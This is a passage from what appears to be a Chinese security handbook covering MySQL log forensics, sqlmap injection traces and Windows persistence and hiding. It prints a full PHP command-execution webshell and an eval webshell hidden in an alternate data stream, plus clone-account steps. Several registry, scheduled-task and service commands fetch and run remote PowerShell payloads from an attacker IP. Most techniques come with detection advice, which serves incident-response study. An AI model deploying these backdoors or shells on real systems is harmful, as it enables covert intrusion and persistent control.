登录成功/失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p><p><img src="/image/log-5-1.png" srcset="/img/loading.gif" alt=""></p><p>MySQL中的log记录是这样子：</p><pre><code class="hljs routeros">Time                 Id        Command         Argument190601 22:03:20   98 Connectroot@192.168.204.1 on    98 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'root'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)  103 Connectmysql@192.168.204.1 on   103 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'mysql'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)  104 Connectmysql@192.168.204.1 on   104 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'mysql'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)  100 Connectroot@192.168.204.1 on   101 Connectroot@192.168.204.1 on   101 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'root'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)   99 Connectroot@192.168.204.1 on    99 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'root'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)  105 Connectmysql@192.168.204.1 on   105 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'mysql'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)  100 Query<span class="hljs-builtin-name">set</span> <span class="hljs-attribute">autocommit</span>=0  102 Connectmysql@192.168.204.1 on   102 ConnectAccess denied <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'mysql'</span>@<span class="hljs-string">'192.168.204.1'</span> (using password: <span class="hljs-literal">YES</span>)  100 Quit`</code></pre><p>你知道在这个口令猜解过程中，哪个是成功的吗？</p><p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p><pre><code class="hljs angelscript"><span class="hljs-number">190601</span> <span class="hljs-number">22</span>:<span class="hljs-number">03</span>:<span class="hljs-number">20</span>     <span class="hljs-number">100</span> Connect<span class="hljs-symbol">root@</span><span class="hljs-number">192.168</span><span class="hljs-number">.204</span><span class="hljs-number">.1</span> on    <span class="hljs-number">100</span> Query<span class="hljs-keyword">set</span> <span class="hljs-built_in">auto</span>commit=<span class="hljs-number">0</span>   <span class="hljs-number">100</span> Quit</code></pre><p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p><p>Navicat for MySQL登录：</p><pre><code class="hljs sql">190601 22:14:07  106 Connectroot@192.168.204.1 on          106 Query<span class="hljs-keyword">SET</span> <span class="hljs-keyword">NAMES</span> utf8         <span class="hljs-number">106</span> <span class="hljs-keyword">Query</span><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">VARIABLES</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'lower_case_%'</span>         <span class="hljs-number">106</span> <span class="hljs-keyword">Query</span><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">VARIABLES</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'profiling'</span>         <span class="hljs-number">106</span> <span class="hljs-keyword">Query</span><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">DATABASES</span></code></pre><p>命令行登录：</p><pre><code class="hljs angelscript"><span class="hljs-number">190601</span> <span class="hljs-number">22</span>:<span class="hljs-number">17</span>:<span class="hljs-number">25</span>  <span class="hljs-number">111</span> Connect<span class="hljs-symbol">root@</span>localhost on          <span class="hljs-number">111</span> Queryselect @@version_comment limit <span class="hljs-number">1</span><span class="hljs-number">190601</span> <span class="hljs-number">22</span>:<span class="hljs-number">17</span>:<span class="hljs-number">56</span>  <span class="hljs-number">111</span> Quit</code></pre><p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p><p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p><p>登录失败的记录：</p><pre><code class="hljs basic"><span class="hljs-symbol">102 </span>Connectmysql@<span class="hljs-number">192.168.204.1</span> <span class="hljs-keyword">on</span> <span class="hljs-symbol">102 </span>ConnectAccess denied <span class="hljs-keyword">for</span> user <span class="hljs-comment">'mysql'@'192.168.204.1' (using password: YES)</span></code></pre><p>利用shell命令进行简单的分析：</p><pre><code class="hljs lsl">#有哪些IP在爆破？grep  <span class="hljs-string">"Access denied"</span> mysql.log |cut -d <span class="hljs-string">"'"</span> -f4|uniq -c|sort -nr     <span class="hljs-number">27</span> <span class="hljs-number">192.168</span><span class="hljs-number">.204</span><span class="hljs-number">.1</span>#爆破用户名字典都有哪些？grep  <span class="hljs-string">"Access denied"</span> mysql.log |cut -d <span class="hljs-string">"'"</span> -f2|uniq -c|sort -nr     <span class="hljs-number">13</span> mysql     <span class="hljs-number">12</span> root      <span class="hljs-number">1</span> root      <span class="hljs-number">1</span> mysql</code></pre><p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p><p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p><h3 id="0x03-SQL注入入侵痕迹"><a href="#0x03-SQL注入入侵痕迹" class="headerlink" title="0x03  SQL注入入侵痕迹"></a>0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="/image/log-5-3.png" srcset="/img/loading.gif" alt=""></p><p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p><p>tmpbwyov.php：</p><!--?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2-->&amp;1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?&gt;<p>`</p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、检查网站目录下，是否存在一些木马文件：</p><p><img src="/image/log-5-4.png" srcset="/img/loading.gif" alt=""></p><p>2、检查是否有UDF提权、MOF提权痕迹</p><p>检查目录是否有异常文件</p><p>mysql\lib\plugin </p><p>c:/windows/system32/wbem/mof/</p><p>检查函数是否删除</p><p><code>select * from mysql.func</code></p><p>3、结合web日志分析。</p><h1 id="第三章：权限维持篇"><a href="#第三章：权限维持篇" class="headerlink" title="第三章：权限维持篇"></a>第三章：权限维持篇</h1><h2 id="第1篇：Windows权限维持–隐藏篇"><a href="#第1篇：Windows权限维持–隐藏篇" class="headerlink" title="第1篇：Windows权限维持–隐藏篇"></a>第1篇：Windows权限维持–隐藏篇</h2><h3 id="0x00-前言-3"><a href="#0x00-前言-3" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p><h3 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h3><p><strong>1、利用文件属性</strong></p><p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。</p><p><img src="/image/privilege-1-1.png" srcset="/img/loading.gif" alt=""></p><p>如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。</p><p><img src="/image/privilege-1-2.png" srcset="/img/loading.gif" alt=""></p><p>如何真正隐藏文件？</p><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><p><code>attrib +s +a +h +r  D:\test\project\test</code>.txt</p><p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p><p>破解隐藏文件：</p><p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="/image/privilege-1-3.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、利用ADS隐藏文件内容</strong></p><p>​    在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞： 　</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'chopper'</span>]);?^&gt; &gt; index.php:hidden.jpg</code></pre><p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。　</p><pre><code class="hljs axapta">问题<span class="hljs-number">1</span>：如何查看<span class="hljs-keyword">index</span>.php:hidden.jpg内容呢？　　进入文件所在目录，notepad <span class="hljs-keyword">index</span>.php:hidden.jpg    或者 dir /r　　问题<span class="hljs-number">2</span>：如何删除<span class="hljs-keyword">index</span>.php:hidden.jpg？     直接删除<span class="hljs-keyword">index</span>.php即可</code></pre><p><strong>3、驱动级文件隐藏</strong></p><p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker      </p><p>下载链接： <a href="http://www.xoslab.com/efl.html" target="_blank" rel="noopener">http://www.xoslab.com/efl.html</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><pre><code class="hljs taggerscript">c:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\x</span>lkfs.datc:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\x</span>lkfs.dllc:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\x</span>lkfs.inic:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\x</span>lkfs.sys</code></pre><p>那么你，应该是遭遇了驱动级文件隐藏。</p><p>如何清除？</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、查询服务状态： sc qc xlkfs<span class="hljs-number">2</span>、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现<span class="hljs-number">3</span>、删除服务： sc delete xlkfs<span class="hljs-number">4</span>、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</code></pre><p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p><p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p><h3 id="0x02-隐藏账号"><a href="#0x02-隐藏账号" class="headerlink" title="0x02 隐藏账号"></a>0x02 隐藏账号</h3><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。</p><p><img src="/image/privilege-1-4.png" srcset="/img/loading.gif" alt=""></p><p>PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。</p><p>克隆账号制作过程：</p><p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p><p><img src="/image/privilege-1-5.png" srcset="/img/loading.gif" alt=""></p><p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。</p><p><img src="/image/privilege-1-6.png" srcset="/img/loading.gif" alt=""></p><p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。</p><p><img src="/image/privilege-1-7.png" srcset="/img/loading.gif" alt=""></p><p>4、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del</p><p><img src="/image/privilege-1-8.png" srcset="/img/loading.gif" alt=""></p><p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p><p>检测和清理方法：</p><p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p><p><img src="/image/privilege-1-9.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x03-端口复用"><a href="#0x03-端口复用" class="headerlink" title="0x03 端口复用"></a>0x03 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p><p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p><p><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}</code></p><p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p><p><img src="/image/privilege-1-19.png" srcset="/img/loading.gif" alt=""></p><p>当执行这条命令的同时，将在安全日志中留下痕迹，</p><p><img src="/image/privilege-1-20.png" srcset="/img/loading.gif" alt=""></p><p>另外，可以通过代码实现端口复用重定向，工具：<a href="https://github.com/crabkun/Switcher" target="_blank" rel="noopener">https://github.com/crabkun/Switcher</a></p><h3 id="0x04-进程注入"><a href="#0x04-进程注入" class="headerlink" title="0x04 进程注入"></a>0x04 进程注入</h3><p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p><p><strong>1、meterpreter会话注入</strong></p><p>当前权限无法获取hash值，查看目前系统进程</p><p><img src="/image/privilege-1-10.png" srcset="/img/loading.gif" alt=""></p><p>通过migrate将进程注入到system进程后，成功获得hash值。</p><p><img src="/image/privilege-1-11.png" srcset="/img/loading.gif" alt=""></p><p>Window后门排查：</p><p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 </p><p><img src="/image/privilege-1-12.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、Empire会话进程注入</strong></p><p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p><p><img src="/image/privilege-1-13.png" srcset="/img/loading.gif" alt=""></p><p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p><p><img src="/image/privilege-1-14.png" srcset="/img/loading.gif" alt=""></p><p><img src="/image/privilege-1-15.png" srcset="/img/loading.gif" alt=""></p><p><strong>3、Cobalt Strike进程注入</strong></p><p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p><p><img src="/image/privilege-1-16.png" srcset="/img/loading.gif" alt=""></p><p><img src="/image/privilege-1-17.png" srcset="/img/loading.gif" alt=""></p><p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p><p><img src="/image/privilege-1-18.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x05-结束"><a href="#0x05-结束" class="headerlink" title="0x05  结束"></a>0x05  结束</h3><p>本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。</p><p>参考链接：</p><p>Canisrufus:一款基于Python的Windows隐藏后门</p><p><a href="https://github.com/maldevel/canisrufus" target="_blank" rel="noopener">https://github.com/maldevel/canisrufus</a></p><p>windows常见backdoor、权限维持方法及排查技术</p><p><a href="https://xz.aliyun.com/t/4842" target="_blank" rel="noopener">https://xz.aliyun.com/t/4842</a></p><p>TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS</p><p><a href="https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/" target="_blank" rel="noopener">https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/</a></p><p>Hide Toolz 进程隐藏工具</p><p>官网地址:<a href="https://www.hidetoolz.com/" target="_blank" rel="noopener">https://www.hidetoolz.com/</a></p><p>HideToolz是一款简单小巧的软件，可以隐藏进程，一键隐藏你想隐藏的程序</p><h4 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h4><p>注入工具</p><p>cs 进程注入</p><p><a href="https://bbs.ichunqiu.com/thread-53003-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-53003-1-1.html</a></p><h4 id="Metasploit注入-dll"><a href="#Metasploit注入-dll" class="headerlink" title="Metasploit注入 dll"></a>Metasploit注入 dll</h4><p><a href="https://blog.csdn.net/Fly_hps/article/details/80427707" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80427707</a></p><p>几种后门和权限维持技术外还有像是dll劫持、一些软件的插件后门、office后门等。</p><p><a href="https://blog.csdn.net/qq_33020901/article/details/89504902" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/89504902</a></p><h2 id="第2篇：Windows权限维持–后门篇"><a href="#第2篇：Windows权限维持–后门篇" class="headerlink" title="第2篇：Windows权限维持–后门篇"></a>第2篇：Windows权限维持–后门篇</h2><p>关键词：Windows系统后门、权限维持</p><p>在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。</p><p><strong>0x01 注册表自启动</strong></p><p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p><p>常用的注册表启动键：</p><pre><code class="hljs taggerscript"># Run键 HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unHKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un# Winlogon<span class="hljs-symbol">\U</span>serinit键HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsNT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogonHKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsNT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon类似的还有很多,关键词：注册表启动键值。</code></pre><p>使用以下命令可以一键实现无文件注册表后门：</p><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\"" /f</code></p><p><strong>Logon Scripts 后门</strong></p><p>注册表路径：HKEY_CURRENT_USER\Environment\</p><p>创建字符串键值：  UserInitMprLogonScript，键值设置为bat的绝对路径：<code>c:\test.bat</code></p><p><strong>userinit后门</strong></p><p>在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p><p>利用USERINIT注册表键实现无文件后门：</p><pre><code class="hljs taggerscript">[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon] "Userinit"="C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>system32<span class="hljs-symbol">\\</span>userinit.exe,C:<span class="hljs-symbol">\\</span>Windows<span class="hljs-symbol">\\</span>System32<span class="hljs-symbol">\\</span>WindowsPowerShell<span class="hljs-symbol">\\</span>v1.0<span class="hljs-symbol">\\</span>powershell.exe -nop -w hidden -c <span class="hljs-symbol">\"</span>IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))<span class="hljs-symbol">\"</span>"</code></pre><p><strong>0x02 组策略设置脚本启动</strong></p><p>运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p><p><img src="/image/privilege-4-3.png" srcset="/img/loading.gif" alt=""></p><p>容易遇到的问题：脚本需全路径，如<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p><p><strong>0x03 计划任务</strong></p><p>通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p><p>使用以下命令可以一键实现：</p><pre><code class="hljs lsl">schtasks /create /sc minute /mo <span class="hljs-number">1</span> /tn <span class="hljs-string">"Security Script"</span> /tr <span class="hljs-string">"powershell.exe -nop -w hidden -c <span class="hljs-subst">\"</span>IEX ((new-object net.webclient).downloadstring(<span class="hljs-subst">\"</span><span class="hljs-subst">\"</span><span class="hljs-subst">\"</span>http://192.168.28.142:8888/logo.gif<span class="hljs-subst">\"</span><span class="hljs-subst">\"</span><span class="hljs-subst">\"</span>))<span class="hljs-subst">\"</span>"</span></code></pre><p>容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p><p>计划脚本每 1 分钟运行一次。</p><p><img src="/image/privilege-4-4.png" srcset="/img/loading.gif" alt=""></p><p><strong>0x04 服务自启动</strong></p><p>通过服务设置自启动，结合powershell实现无文件后门。</p><p>使用以下命令可实现：</p><pre><code class="hljs sql">sc <span class="hljs-keyword">create</span> <span class="hljs-string">"KeyName"</span> binpath= <span class="hljs-string">"cmd /c start powershell.exe -nop -w hidden -c \"</span>IEX ((<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> net.webclient).downloadstring(<span class="hljs-string">'http://192.168.28.142:8888/logo.gif'</span>))\<span class="hljs-string">""</span>sc description  KeyName <span class="hljs-string">"Just For Test"</span>   //设置服务的描述字符串sc config <span class="hljs-keyword">Name</span> <span class="hljs-keyword">start</span>= <span class="hljs-keyword">auto</span>                //设置这个服务为自动启动net <span class="hljs-keyword">start</span> <span class="hljs-keyword">Name</span>                            //启动服务</code></pre><p>成功创建了一个自启动服务</p><p><img src="/image/privilege-4-5.png" srcset="/img/loading.gif" alt=""></p><p><strong>0x05 WMI后门</strong></p><p>在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。</p><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\Persistence\Persistence.psm1<span class="hljs-variable">$ElevatedOptions</span> = <span class="hljs-built_in">New-ElevatedPersistenceOption</span> <span class="hljs-literal">-PermanentWMI</span> <span class="hljs-literal">-Daily</span> <span class="hljs-literal">-At</span> <span class="hljs-string">'3 PM'</span><span class="hljs-variable">$UserOptions</span> = <span class="hljs-built_in">New-UserPersistenceOption</span> <span class="hljs-literal">-Registry</span> <span class="hljs-literal">-AtLogon</span><span class="hljs-built_in">Add-Persistence</span> <span class="hljs-literal">-FilePath</span> .\EvilPayload.ps1 <span class="hljs-literal">-ElevatedPersistenceOption</span> <span class="hljs-variable">$ElevatedOptions</span> <span class="hljs-literal">-UserPersistenceOption</span> <span class="hljs-variable">$UserOptions</span> <span class="hljs-literal">-Verbose</span></code></pre><p><strong>0x06 dll劫持</strong></p><p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p><p>比较常用的如LPK.dll的劫持：</p><p>win7及win7以上系统增加了KnownDLLs保护，需要在注册表：</p><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\S</span>essionManager<span class="hljs-symbol">\E</span>xcludeFromKnownDlls</code></pre><p>下添加 “lpk.dll” 才能顺利劫持：</p><p><img src="/image/privilege-4-6.png" srcset="/img/loading.gif" alt=""></p><p><strong>0x07 COM劫持</strong></p><p>利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。</p><p><img src="/image/privilege-4-7.png" srcset="/img/loading.gif" alt=""></p><p><strong>0x08 远程控制</strong></p><p>远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。</p><p>一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。</p><p><img src="/image/privilege-4-8.png" srcset="/img/loading.gif" alt=""></p><p><strong>0x09 结束语</strong></p><p>未知攻焉知防，本文分享了几种Window下的自动启权限维持技术。管理员在平时运维过程应当保持警惕，掌握一定的入侵排查技巧，及时进行系统补丁更新，定期对服务器安全检查，才能有效地预防后门。</p><p>参考文章：</p><pre><code class="hljs awk">常见的几种Windows后门持久化方式：https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">195906</span>.htmlwindows常见后门隐藏和权限维持方法https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_33020901/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">89504902</span></code></pre><p><a href="http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/</a></p><p>基于Python的隐秘Windows后门，使用Github作为命令和控制服务器</p><p><a href="https://github.com/maldevel/canisrufus" target="_blank" rel="noopener">https://github.com/maldevel/canisrufus</a></p><p>注册表位置参考</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.360doc.com/content/12/0217/15/1309227_187374989.shtml</span><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.secpulse.com/archives/103301.html</span></code></pre><p>WMI后门参考</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.hackdig.com<span class="hljs-regexp">/11/</span>hack-<span class="hljs-number">40748</span>.htmhttps:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_17204441/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">91863383</span></code></pre><p>无文件WMI和PowerShell后门</p><pre><code class="hljs crystal">Windows 下的权限维持：<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/www.anquanke.com/post</span><span class="hljs-regexp">/id/</span><span class="hljs-number">171528</span>Windows下的权限维持（二）<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/www.anquanke.com/post</span><span class="hljs-regexp">/id/</span><span class="hljs-number">172851</span></code></pre><h2 id="第3篇：Linux权限维持–隐藏篇"><a href="#第3篇：Linux权限维持–隐藏篇" class="headerlink" title="第3篇：Linux权限维持–隐藏篇"></a>第3篇：Linux权限维持–隐藏篇</h2><h3 id="0x00-前言-4"><a href="#0x00-前言-4" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p><h3 id="0x01-隐藏文件-1"><a href="#0x01-隐藏文件-1" class="headerlink" title="0x01 隐藏文件"></a>0x01 